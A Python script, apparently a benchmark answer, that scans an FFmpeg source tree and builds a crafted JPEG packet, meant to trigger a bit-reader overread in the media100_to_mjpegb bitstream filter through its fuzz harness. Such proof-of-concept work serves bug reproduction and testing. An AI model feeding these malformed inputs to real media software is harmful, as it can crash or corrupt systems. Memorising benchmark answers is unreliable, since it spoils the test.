import os
import re
import tarfile
from typing import Dict, List, Optional, Tuple


class Solution:
    def _iter_text_files_from_tar(self, tar: tarfile.TarFile, max_size: int = 2_000_000):
        exts = (".c", ".h", ".cc", ".cpp", ".m", ".mm", ".S", ".asm", ".inc", ".in", ".mk", ".am", ".sh", ".py", ".txt")
        for m in tar:
            if not m.isreg():
                continue
            name = m.name
            if not name.lower().endswith(exts):
                continue
            if m.size <= 0 or m.size > max_size:
                continue
            try:
                f = tar.extractfile(m)
                if not f:
                    continue
                b = f.read()
            except Exception:
                continue
            try:
                s = b.decode("utf-8", "ignore")
            except Exception:
                continue
            if s:
                yield name, s

    def _iter_text_files_from_dir(self, root: str, max_size: int = 2_000_000):
        exts = (".c", ".h", ".cc", ".cpp", ".m", ".mm", ".S", ".asm", ".inc", ".in", ".mk", ".am", ".sh", ".py", ".txt")
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                if not fn.lower().endswith(exts):
                    continue
                p = os.path.join(dirpath, fn)
                try:
                    st = os.stat(p)
                except Exception:
                    continue
                if st.st_size <= 0 or st.st_size > max_size:
                    continue
                try:
                    with open(p, "rb") as f:
                        b = f.read()
                except Exception:
                    continue
                try:
                    s = b.decode("utf-8", "ignore")
                except Exception:
                    continue
                rel = os.path.relpath(p, root)
                yield rel, s

    def _find_media100_bsf_source(self, files_iter) -> Optional[str]:
        best = None
        for name, text in files_iter:
            if "media100_to_mjpegb" in name or "media100_to_mjpegb" in text:
                if name.endswith("media100_to_mjpegb.c"):
                    return text
                if best is None and ("media100_to_mjpegb" in text and ("AVBitStreamFilter" in text or "bsf" in name)):
                    best = text
        return best

    def _extract_size_constraints(self, bsf_src: Optional[str]) -> Tuple[Optional[int], int, Optional[int]]:
        """
        Returns: (exact_size, min_required_size, multiple_of)
        """
        if not bsf_src:
            return None, 0, None

        exact_candidates: List[int] = []
        min_candidates: List[int] = []
        mult_candidates: List[int] = []

        # Prefer direct checks on pkt->size or in->size
        for m in re.finditer(r'\b(\w+)\s*->\s*size\s*!=\s*(\d+)\b', bsf_src):
            var = m.group(1)
            val = int(m.group(2))
            if 0 < val <= 200000 and var in ("in", "pkt", "ipkt", "in_pkt", "inpacket", "in_packet"):
                exact_candidates.append(val)

        for m in re.finditer(r'\b(\w+)\s*->\s*size\s*==\s*(\d+)\b', bsf_src):
            var = m.group(1)
            val = int(m.group(2))
            if 0 < val <= 200000 and var in ("in", "pkt", "ipkt", "in_pkt", "inpacket", "in_packet"):
                exact_candidates.append(val)

        for m in re.finditer(r'\b(\w+)\s*->\s*size\s*<\s*(\d+)\b', bsf_src):
            var = m.group(1)
            val = int(m.group(2))
            if 0 < val <= 200000 and var in ("in", "pkt", "ipkt", "in_pkt", "inpacket", "in_packet"):
                min_candidates.append(val)

        for m in re.finditer(r'\b(\w+)\s*->\s*size\s*<=\s*(\d+)\b', bsf_src):
            var = m.group(1)
            val = int(m.group(2))
            if 0 < val <= 200000 and var in ("in", "pkt", "ipkt", "in_pkt", "inpacket", "in_packet"):
                min_candidates.append(val + 1)

        for m in re.finditer(r'\b(\w+)\s*->\s*size\s*%\s*(\d+)\b', bsf_src):
            var = m.group(1)
            val = int(m.group(2))
            if 0 < val <= 65536 and var in ("in", "pkt", "ipkt", "in_pkt", "inpacket", "in_packet"):
                mult_candidates.append(val)

        exact_size = None
        if exact_candidates:
            # choose most frequent
            freq: Dict[int, int] = {}
            for v in exact_candidates:
                freq[v] = freq.get(v, 0) + 1
            exact_size = max(freq.items(), key=lambda kv: (kv[1], kv[0]))[0]

        min_required = max(min_candidates) if min_candidates else 0

        multiple_of = None
        if mult_candidates:
            # choose smallest reasonable multiple (often 1024 etc.)
            mult_candidates = sorted(set(mult_candidates))
            for v in mult_candidates:
                if v >= 16:
                    multiple_of = v
                    break
            if multiple_of is None:
                multiple_of = mult_candidates[0]

        return exact_size, min_required, multiple_of

    def _parse_bsf_list_index(self, text: str, target: str = "media100_to_mjpegb") -> Optional[int]:
        # Parse list entries like &ff_media100_to_mjpegb_bsf
        entries = re.findall(r'&\s*ff_([A-Za-z0-9_]+)_bsf\b', text)
        if not entries:
            return None
        for i, e in enumerate(entries):
            if e == target:
                return i
        return None

    def _find_bsf_list_text(self, files_iter) -> Optional[str]:
        best = None
        for name, text in files_iter:
            if name.endswith("libavcodec/bsf_list.c") or name.endswith("/libavcodec/bsf_list.c") or name.endswith("bsf_list.c"):
                return text
            if "bitstream_filters" in text and "AVBitStreamFilter" in text and "&ff_" in text and "_bsf" in text:
                best = text
        return best

    def _parse_bsf_names_array_index(self, fuzzer_text: str, target: str = "media100_to_mjpegb") -> Optional[int]:
        pos = fuzzer_text.find("bsf_names")
        if pos < 0:
            return None
        brace = fuzzer_text.find("{", pos)
        if brace < 0:
            return None
        end = fuzzer_text.find("};", brace)
        if end < 0:
            return None
        block = fuzzer_text[brace:end]
        # extract quoted strings in initializer
        strs = re.findall(r'"([^"\\]*(?:\\.[^"\\]*)*)"', block)
        if not strs:
            return None
        def unescape(s: str) -> str:
            try:
                return bytes(s, "utf-8").decode("unicode_escape", "ignore")
            except Exception:
                return s
        strs2 = [unescape(s) for s in strs]
        for i, s in enumerate(strs2):
            if s == target:
                return i
        return None

    def _find_bsf_fuzzer_texts(self, files_iter) -> List[Tuple[str, str]]:
        out = []
        for name, text in files_iter:
            if "LLVMFuzzerTestOneInput" not in text:
                continue
            tl = text.lower()
            if "bsf" not in tl and "bitstream" not in tl:
                continue
            if "av_bsf_" in text or "AVBitStreamFilter" in text or "av_bsf" in tl:
                out.append((name, text))
        return out

    def _decide_prefix(self, bsf_list_text: Optional[str], bsf_fuzzer_texts: List[Tuple[str, str]]) -> Tuple[bytes, int]:
        """
        Returns (prefix_bytes, prefix_len_consumed_from_input_before_packet_payload)
        """
        target = "media100_to_mjpegb"

        # Prefer fuzzer that contains bsf_names array
        for _, ftxt in bsf_fuzzer_texts:
            if "bsf_names" in ftxt:
                idx = self._parse_bsf_names_array_index(ftxt, target=target)
                if idx is not None:
                    return bytes([idx & 0xFF]), 1

        # If selection via bitstream_filters index
        if bsf_list_text:
            idx = self._parse_bsf_list_index(bsf_list_text, target=target)
            if idx is not None:
                # If any fuzzer seems to pick by index, assume 1 byte selector
                for _, ftxt in bsf_fuzzer_texts:
                    if "bitstream_filters" in ftxt and ("data[0]" in ftxt or "ConsumeIntegral" in ftxt or "fuzz" in ftxt.lower()):
                        return bytes([idx & 0xFF]), 1

        # If fuzzer uses name from data as string (rare), provide NUL-terminated name
        for _, ftxt in bsf_fuzzer_texts:
            if "av_bsf_get_by_name" in ftxt and "bsf_names" not in ftxt and "bitstream_filters" not in ftxt:
                # Heuristic: it might read a string from input
                # We add a NUL terminator; payload follows.
                return (target.encode("ascii") + b"\x00"), len(target) + 1

        # Default: no prefix
        return b"", 0

    def _u16be(self, x: int) -> bytes:
        return bytes([(x >> 8) & 0xFF, x & 0xFF])

    def _seg(self, marker: int, data: bytes) -> bytes:
        # marker includes 0xFF?? as 16-bit
        return bytes([(marker >> 8) & 0xFF, marker & 0xFF]) + self._u16be(len(data) + 2) + data

    def _make_jpeg_packet(self, target_len: Optional[int] = None, components: int = 3, include_app0_jfif: bool = True) -> bytes:
        if components not in (1, 3):
            components = 3

        soi = b"\xFF\xD8"
        app0 = b""
        if include_app0_jfif:
            app0_data = b"JFIF\x00" + b"\x01\x02" + b"\x00" + b"\x00\x01" + b"\x00\x01" + b"\x00\x00"
            app0 = self._seg(0xFFE0, app0_data)

        # DQT (one table, 8-bit)
        qt = bytes([0]) + bytes([(i & 0xFF) for i in range(1, 65)])
        dqt = self._seg(0xFFDB, qt)

        # SOF0
        height = 1
        width = 1
        precision = 8
        if components == 1:
            comp_spec = bytes([1, 0x11, 0])  # id=1, sampling=1x1, qt=0
            sof_data = bytes([precision]) + self._u16be(height) + self._u16be(width) + bytes([1]) + comp_spec
        else:
            comp1 = bytes([1, 0x11, 0])
            comp2 = bytes([2, 0x11, 0])
            comp3 = bytes([3, 0x11, 0])
            sof_data = bytes([precision]) + self._u16be(height) + self._u16be(width) + bytes([3]) + comp1 + comp2 + comp3
        sof0 = self._seg(0xFFC0, sof_data)

        # SOS (no DHT segment on purpose)
        if components == 1:
            sos_comp = bytes([1, 0x00])
            sos_data = bytes([1]) + sos_comp + bytes([0, 63, 0])
        else:
            sos_data = bytes([3]) + bytes([1, 0x00, 2, 0x11, 3, 0x11]) + bytes([0, 63, 0])
        sos = self._seg(0xFFDA, sos_data)

        # Entropy-coded data length exactly 1 byte to encourage bitreader overread into padding
        scan = b"\x00"
        eoi = b"\xFF\xD9"

        base = soi + app0 + dqt + sof0 + sos + scan + eoi
        if target_len is None:
            return base

        if target_len <= len(base):
            # Try removing APP0 or using grayscale if needed
            if include_app0_jfif:
                base2 = self._make_jpeg_packet(target_len=None, components=components, include_app0_jfif=False)
                if len(base2) <= target_len:
                    base = base2
            if len(base) > target_len and components == 3:
                base3 = self._make_jpeg_packet(target_len=None, components=1, include_app0_jfif=include_app0_jfif)
                if len(base3) <= target_len:
                    base = base3
            if len(base) > target_len:
                # Can't shrink safely; return base
                return base

        pad_total = target_len - len(base)
        if pad_total <= 0:
            return base
        if pad_total < 4:
            # Can't create a valid COM segment of size <4; return base (min constraints likely not exact)
            return base

        # Insert COM segment right after APP0 (or right after SOI if no APP0)
        # COM total size = 2(marker)+2(length)+data_len => pad_total
        data_len = pad_total - 4
        if data_len > 65533:
            # If too big, split into multiple COM segments
            max_total = 65535  # marker+len+data total can't exceed 65539 but length field max 65535 includes 2
            # For COM: length field max 65535 => data_len max 65533 => total segment bytes 65537? Wait:
            # Segment total bytes = 2(marker) + 2(length) + data_len, and length = data_len+2 <= 65535 => data_len<=65533.
            # total bytes then <= 2+2+65533 = 65537.
            # We'll use data_len=65533 for large segments.
            parts: List[bytes] = []
            remain = pad_total
            while remain >= 4:
                dl = min(remain - 4, 65533)
                seg = bytes([0xFF, 0xFE]) + self._u16be(dl + 2) + (b"A" * dl)
                parts.append(seg)
                remain -= (dl + 4)
                if remain < 4:
                    # can't add more exact padding; stop
                    remain = 0
            com = b"".join(parts)
        else:
            com = bytes([0xFF, 0xFE]) + self._u16be(data_len + 2) + (b"A" * data_len)

        # Rebuild base with COM inserted before DQT
        # base structure: SOI + APP0? + DQT + SOF0 + SOS + scan + EOI
        soi = b"\xFF\xD8"
        app0 = b""
        if include_app0_jfif and base.startswith(soi + b"\xFF\xE0"):
            # Extract actual APP0 from base:
            # Find end of APP0 by reading its length
            if len(base) >= 6 and base[2] == 0xFF and base[3] == 0xE0:
                seglen = (base[4] << 8) | base[5]
                app0_end = 2 + 2 + seglen  # marker+length+data where seglen includes 2 length bytes
                app0 = base[2:app0_end]
                rest = base[app0_end:]
                rebuilt = soi + app0 + com + rest
                return rebuilt
        # Fallback insertion after SOI
        return soi + com + base[2:]

    def solve(self, src_path: str) -> bytes:
        is_dir = os.path.isdir(src_path)

        bsf_src = None
        bsf_list_text = None
        bsf_fuzzer_texts: List[Tuple[str, str]] = []

        if is_dir:
            it1 = list(self._iter_text_files_from_dir(src_path))
            bsf_src = self._find_media100_bsf_source(iter(it1))
            bsf_list_text = self._find_bsf_list_text(iter(it1))
            bsf_fuzzer_texts = self._find_bsf_fuzzer_texts(iter(it1))
        else:
            try:
                with tarfile.open(src_path, "r:*") as tar:
                    all_texts = list(self._iter_text_files_from_tar(tar))
            except Exception:
                all_texts = []
            bsf_src = self._find_media100_bsf_source(iter(all_texts))
            bsf_list_text = self._find_bsf_list_text(iter(all_texts))
            bsf_fuzzer_texts = self._find_bsf_fuzzer_texts(iter(all_texts))

        exact_size, min_required, multiple_of = self._extract_size_constraints(bsf_src)
        prefix, prefix_len = self._decide_prefix(bsf_list_text, bsf_fuzzer_texts)

        packet_target = None
        if exact_size is not None and exact_size > 0:
            packet_target = exact_size
        else:
            packet_target = max(min_required, 0)
            if multiple_of is not None and multiple_of > 0 and packet_target > 0:
                # choose a small multiple satisfying min requirement, but at least 256 to avoid tiny packets being rejected
                m = multiple_of
                desired = max(packet_target, 256)
                packet_target = ((desired + m - 1) // m) * m

        # If we inferred a target but it's still tiny, don't force it
        if packet_target is not None and packet_target < 64:
            packet_target = None

        # Build JPEG packet
        if packet_target is None:
            jpeg_pkt = self._make_jpeg_packet(target_len=None, components=3, include_app0_jfif=True)
        else:
            jpeg_pkt = self._make_jpeg_packet(target_len=packet_target, components=3, include_app0_jfif=True)

        return prefix + jpeg_pkt